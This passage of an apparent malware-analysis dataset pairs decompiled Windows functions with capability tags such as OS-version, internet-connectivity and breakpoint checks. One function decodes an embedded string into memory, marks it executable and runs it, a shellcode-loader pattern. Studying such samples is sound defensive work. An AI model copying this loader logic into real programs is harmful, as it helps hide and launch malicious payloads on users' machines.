fcn.00406070(0x430248, 0x42ae74);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42aec4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42af14);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42af64);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42afb4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b004);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b054);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b0a4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b0f4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b144);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b194);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b1e4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b234);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b284);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b2d4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b324);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b374);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b3c4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b414);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b464);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b4b4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b504);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b554);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b5a4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b5f4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b644);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b694);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b6e4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b734);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b784);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b7d4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b824);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b874);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b8c4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b914);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b964);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42b9b4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42ba04);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42ba54);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42baa4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42baf4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42bb44);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42bb94);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42bbe4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42bc34);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42bc84);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42bcd4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42bd24);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42bd74);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42bdc4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42be14);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42be64);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42beb4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42bf04);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42bf54);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42bfa4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42bff4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42c044);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42c094);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42c0e4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42c134);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42c184);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42c1d4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42c224);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42c274);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42c2c4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42c314);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42c364);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42c3b4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42c404);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42c454);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42c4a4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42c4f4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42c544);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42c594);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42c5e4);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42c634);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, 0x42c684);\n        fcn.004059e0(pcVar5);\n        pcVar5 = fcn.00405890;\n        fcn.00406070(0x430248, \"r34Xx1HbzKUFgQjKHLue209bVcXjw6lDu5hKLmZY4KIk2VhgdIGtjiKphi38H9mfq2gre27wYqz4M\");\n        fcn.004059e0(pcVar5);\n        var_40h = fcn.00401a16(0xffc6, &var_94h);\n        if (var_40h == 0) {\n            var_4h = 0xffffffff;\n            fcn.00415acc();\n            uVar2 = 0;\n            goto code_r0x00405353;\n        }\n        uVar2 = (**(var_3ch + 0x14))(0, var_94h);\n        var_90h = (**(var_3ch + 8))(uVar2);\n        if (var_90h == NULL) {\n            var_4h = 0xffffffff;\n            fcn.00415acc();\n            uVar2 = 0;\n            goto code_r0x00405353;\n        }\n        fcn.0040167e(var_40h, var_94h, &var_84h, 0x44, var_90h);\n        (**(var_3ch + 0x18))(var_90h, var_94h, 0x40, &var_98h);\n        var_8ch = var_90h;\n        var_88h = (*var_90h)();\n        var_4h = 0xffffffff;\n        fcn.00415acc();\n    }\n    fcn.004063a0(*(param_1 + 0x60), 1);\n    fcn.004063a0(*(param_1 + 0x60), 0);\n    fcn.0040569a();\n    uVar2 = 1;\ncode_r0x00405353:\n    *in_FS_OFFSET = var_ch;\n    return uVar2;\n}\n",
        "token_count": 20934
    },
    "004055be": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004055be(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x41bd13;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.004065bc(1, param_1 + 0x5c, param_1);\n    var_4h = 0;\n    fcn.00415af6(\"Any instructions...\");\n    var_4h._0_1_ = 1;\n    fcn.00406814(&var_24h);\n    var_4h._0_1_ = 0;\n    fcn.00415acc();\n    iVar1 = fcn.004066e2();\n    if (iVar1 == 2) {\n        var_4h = 0xffffffff;\n        fcn.0040668b();\n    }\n    else {\n        uVar2 = fcn.00406830(&var_28h);\n        var_4h._0_1_ = 2;\n        fcn.00415b75(uVar2);\n        var_4h = var_4h._1_3_ << 8;\n        fcn.00415acc();\n        fcn.00417dc4(0);\n        var_4h = 0xffffffff;\n        fcn.0040668b();\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 407
    },
    "0040569a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_60h\n\nvoid __fastcall fcn.0040569a(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_20h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    \n    iVar1 = fcn.004186c1(0x3e9, param_1);\n    if ((iVar1 != 0) && (iVar1 = fcn.004186c1(1000),  iVar1 != 0)) {\n        fcn.00405900();\n        uVar2 = fcn.00405950();\n        fcn.00405ed0(uVar2);\n        fcn.00405900();\n        uVar2 = fcn.00405950();\n        fcn.00405eb0(uVar2);\n        fcn.00405900();\n        uVar2 = fcn.00405950();\n        fcn.00405eb0(uVar2);\n        iVar1 = fcn.00405910();\n        uVar2 = fcn.00405930();\n        fcn.00418780(var_10h + 0xb, var_ch + 0xb, (((var_8h + -0xb) - (var_10h + 0xb)) - iVar1) + -8, uVar2, 1);\n        fcn.00418780((var_8h + -0xb) - iVar1, var_ch + 0xb, iVar1, uVar2, 1);\n        fcn.00405ef0(1);\n    }\n    return;\n}\n",
        "token_count": 458
    },
    "004058b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nbool __fastcall fcn.004058b0(uint param_1)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.004058d0(param_1);\n    return *(iVar1 + 4) == 0;\n}\n",
        "token_count": 77
    },
    "00405980": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405980(int32_t param_1)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    if (param_1 == 0) {\n        var_8h = 0;\n    }\n    else {\n        var_8h = *(param_1 + 4);\n    }\n    return var_8h;\n}\n",
        "token_count": 82
    },
    "00405c10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405c10(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t in_EAX;\n    uint32_t arg_ch_00;\n    uint32_t uVar1;\n    uint var_4h;\n    \n    if (arg_8h != 0) {\n        arg_ch_00 = in_EAX & 0xffffff00 | arg_ch & 0xff;\n        uVar1 = fcn.00405bf0();\n        fcn.00405c90(uVar1 | arg_8h, arg_ch_00);\n    }\n    return;\n}\n",
        "token_count": 134
    },
    "004066e2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nchar fcn.004066e2(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_134h;\n    uint pidl;\n    uint pszPath;\n    uint var_28h;\n    uint var_24h;\n    uint *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    code *var_14h;\n    uint var_10h;\n    int32_t *ppMalloc;\n    int32_t var_4h;\n    \n    fcn.00415bc5(0x42de44);\n    var_4h = (*_sym.imp.ole32.dll_CoInitializeEx)(0, 2);\n    if ((var_4h == 0) || (var_4h == 1)) {\n        iVar1 = (*_sym.imp.ole32.dll_CoGetMalloc)(1, &ppMalloc);\n        if (iVar1 == 0) {\n            var_28h = fcn.00406920();\n            var_24h = 0;\n            var_20h = &pszPath;\n            var_1ch = fcn.004058f0();\n            var_14h = fcn.00406861;\n            var_10h = 0;\n            var_18h = 9;\n            iVar1 = (*_sym.imp.SHELL32.dll_SHBrowseForFolderA)(&var_28h);\n            if (iVar1 != 0) {\n                iVar2 = (*_sym.imp.SHELL32.dll_SHGetPathFromIDListA)(iVar1, &pszPath);\n                if (iVar2 != 0) {\n                    fcn.00415bc5(&pszPath);\n                }\n                (**(*ppMalloc + 0x14))(ppMalloc, iVar1);\n            }\n            (**(*ppMalloc + 8))(ppMalloc);\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    iVar1 = fcn.004058b0();\n    return (iVar1 != 0) + '\\x01';\n}\n",
        "token_count": 444
    },
    "00406861": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406861(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_108h;\n    uint var_104h;\n    \n    if (arg_ch == 1) {\n        iVar2 = fcn.004058b0();\n        if (iVar2 == 0) {\n            uVar1 = fcn.004058f0();\n            (*_sym.imp.USER32.dll_SendMessageA)(arg_8h, 0x466, 1, uVar1);\n        }\n    }\n    else if ((arg_ch == 2) && (iVar2 = (*_sym.imp.SHELL32.dll_SHGetPathFromIDListA)(arg_10h, &var_104h),  iVar2 != 0)) {\n        (*_sym.imp.USER32.dll_SendMessageA)(arg_8h, 0x464, 0, &var_104h);\n    }\n    return 0;\n}\n",
        "token_count": 224
    },
    "00406920": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00406920(int32_t param_1)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    if (param_1 == 0) {\n        var_8h = 0;\n    }\n    else {\n        var_8h = *(param_1 + 0x1c);\n    }\n    return var_8h;\n}\n",
        "token_count": 85
    },
    "00406f47": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_14h\n\nint32_t * fcn.00406f47(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *extraout_ECX;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    *(unaff_EBP + -0x10) = &var_14h;\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(extraout_ECX + 4);\n    if (extraout_ECX[3] == 0) {\n        iVar3 = *extraout_ECX;\n        *(unaff_EBP + -4) = 0;\n        iVar1 = fcn.0041408f(extraout_ECX + 2, extraout_ECX[1], iVar3);\n        iVar3 = extraout_ECX[1];\n        piVar2 = (iVar3 + -1) * *extraout_ECX + 4 + iVar1;\n        if (-1 < iVar3 + -1) {\n            do {\n                *piVar2 = extraout_ECX[3];\n                extraout_ECX[3] = piVar2;\n                piVar2 = piVar2 - *extraout_ECX;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    piVar2 = extraout_ECX[3];\n    extraout_ECX[3] = *piVar2;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(extraout_ECX + 4);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return piVar2;\n}\n",
        "token_count": 441
    },
    "004073ea": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004073ea(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    int32_t iStack16;\n    \n    iStack16 = param_1;\n    uStack24 = 0x4073c8;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    while( true ) {\n        iVar1 = *(param_1 + 8);\n        iVar2 = *(param_1 + 0xc);\n        if ((iVar2 == -1) || (iVar2 == param_2)) break;\n        uStack20 = *(iVar1 + iVar2 * 0xc);\n        *(param_1 + 0xc) = uStack20;\n        if (*(iVar1 + 4 + iVar2 * 0xc) == 0) {\n            fcn.0040747e(0x101);\n            (**(iVar1 + 8 + iVar2 * 0xc))();\n        }\n    }\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 265
    },
    "0040894c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040894c(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if (arg_8h == 0) {\n        iVar1 = fcn.00407f59(arg_ch);\n    }\n    else {\n        if (arg_ch == 0) {\n            fcn.0040795e(arg_8h);\n        }\n        else {\n            do {\n                iVar1 = 0;\n                if (arg_ch < 0xffffffe1) {\n                    fcn.004096f8(9);\n                    arg_8h_00 = fcn.0040a39e(arg_8h);\n                    if (arg_8h_00 == 0) {\n                        fcn.00409759(9);\n                        if (arg_ch == 0) {\n                            arg_ch = 1;\n                        }\n                        arg_ch = arg_ch + 0xf & 0xfffffff0;\n                        iVar1 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x43165c, 0, arg_8h, arg_ch);\n                    }\n                    else {\n                        if (*0x42d2d0 < arg_ch) {\ncode_r0x004089eb:\n                            if (arg_ch == 0) {\n                                arg_ch = 1;\n                            }\n                            arg_ch = arg_ch + 0xf & 0xfffffff0;\n                            iVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x43165c, 0, arg_ch);\n                            if (iVar1 != 0) {\n                                uVar3 = *(arg_8h + -4) - 1;\n                                if (arg_ch <= uVar3) {\n                                    uVar3 = arg_ch;\n                                }\n                                fcn.00407b70(iVar1, arg_8h, uVar3);\n                                fcn.0040a3c9(arg_8h_00, arg_8h);\n                            }\n                        }\n                        else {\n                            iVar2 = fcn.0040aba9(arg_8h_00, arg_8h, arg_ch);\n                            iVar1 = arg_8h;\n                            if (iVar2 == 0) {\n                                iVar1 = fcn.0040a6f4(arg_ch);\n                                if (iVar1 == 0) goto code_r0x004089eb;\n                                uVar3 = *(arg_8h + -4) - 1;\n                                if (arg_ch <= uVar3) {\n                                    uVar3 = arg_ch;\n                                }\n                                fcn.00407b70(iVar1, arg_8h, uVar3);\n                                fcn.0040a3c9(arg_8h_00, arg_8h);\n                            }\n                            if (iVar1 == 0) goto code_r0x004089eb;\n                        }\n                        fcn.00409759(9);\n                    }\n                    if (iVar1 != 0) {\n                        return iVar1;\n                    }\n                }\n                if (*0x430044 == 0) {\n                    return iVar1;\n                }\n                iVar1 = fcn.0040b2c0(arg_ch);\n            } while (iVar1 != 0);\n        }\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 737
    },
    "00408fd5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.00408fd5(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t unaff_ESI;\n    int32_t *unaff_EDI;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    *(unaff_ESI + -4) = *(unaff_EBP + -0x28);\n    iVar1 = fcn.00409353();\n    *(iVar1 + 0x6c) = *(unaff_EBP + -0x1c);\n    iVar1 = fcn.00409353();\n    *(iVar1 + 0x70) = *(unaff_EBP + -0x20);\n    if ((((*unaff_EDI == -0x1f928c9d) && (unaff_EDI[4] == 3)) && (unaff_EDI[5] == 0x19930520)) &&\n       ((*(unaff_EBP + -0x24) == 0 && (*(unaff_EBP + -0x2c) != 0)))) {\n        fcn.00407452();\n        fcn.00409211();\n    }\n    return;\n}\n",
        "token_count": 279
    },
    "0040a089": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a089(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint var_1a4h;\n    uint var_a0h;\n    \n    iVar2 = 0;\n    piVar1 = 0x42d238;\n    do {\n        if (arg_8h == *piVar1) break;\n        piVar1 = piVar1 + 2;\n        iVar2 = iVar2 + 1;\n    } while (piVar1 < 0x42d2c8);\n    if (arg_8h == *(iVar2 * 8 + 0x42d238)) {\n        if ((*0x42fe18 == 1) || ((*0x42fe18 == 0 && (*0x42cc64 == 1)))) {\n            fcn.004075e0();\n            (*_sym.imp.KERNEL32.dll_GetStdHandle)();\n            (*_sym.imp.KERNEL32.dll_WriteFile)();\n        }\n        else if (arg_8h != 0xfc) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)();\n            if (iVar2 == 0) {\n                fcn.0040a270();\n            }\n            iVar2 = fcn.004075e0();\n            if (0x3c < iVar2 + 1U) {\n                fcn.004075e0();\n                fcn.0040b6b0();\n            }\n            fcn.0040a270();\n            fcn.0040a280();\n            fcn.0040a280();\n            fcn.0040a280();\n            fcn.0040b86a(&var_a0h, \"Microsoft Visual C++ Runtime Library\");\n        }\n    }\n    return;\n}\n",
        "token_count": 391
    },
    "0040ae9f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.0040ae9f(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t arg_8h;\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    arg_8h = param_1 * param_2;\n    uVar1 = arg_8h;\n    if (arg_8h < 0xffffffe1) {\n        if (arg_8h == 0) {\n            uVar1 = 1;\n        }\n        uVar1 = uVar1 + 0xf & 0xfffffff0;\n    }\n    do {\n        iVar2 = 0;\n        if (uVar1 < 0xffffffe1) {\n            if (arg_8h < *0x42d2d0 || arg_8h - *0x42d2d0 == 0) {\n                fcn.004096f8(9);\n                iVar2 = fcn.0040a6f4(arg_8h);\n                fcn.00409759(9);\n                if (iVar2 != 0) {\n                    fcn.004079b0(iVar2, 0, arg_8h);\n                    return iVar2;\n                }\n            }\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x43165c, 8, uVar1);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n        if (*0x430044 == 0) {\n            return iVar2;\n        }\n        iVar2 = fcn.0040b2c0(uVar1);\n    } while (iVar2 != 0);\n    return 0;\n}\n",
        "token_count": 371
    },
    "0040de84": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
